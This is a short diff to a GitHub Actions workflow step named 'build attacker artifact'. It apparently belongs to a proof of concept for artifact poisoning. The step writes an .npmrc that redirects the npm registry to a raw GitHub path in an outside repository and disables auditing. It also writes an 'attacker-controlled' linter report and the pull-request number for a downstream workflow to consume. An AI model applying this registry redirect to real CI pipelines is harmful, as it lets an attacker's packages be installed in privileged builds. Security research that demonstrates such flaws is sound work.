@@ -10,7 +10,7 @@ jobs:
       - name: build attacker artifact
         run: |
           mkdir -p out
-          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-wfr-artifact/main/xdreg/\naudit=false\nfund=false\nprogress=false\n' > out/.npmrc
+          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-wfr-artifact/main/xdreg2/\naudit=false\nfund=false\nprogress=false\n' > out/.npmrc
           printf 'XD attacker-controlled linter report\n' > out/linter-report.txt
           echo "${{ github.event.pull_request.number }}" > out/pr-number.txt
           ls -la out
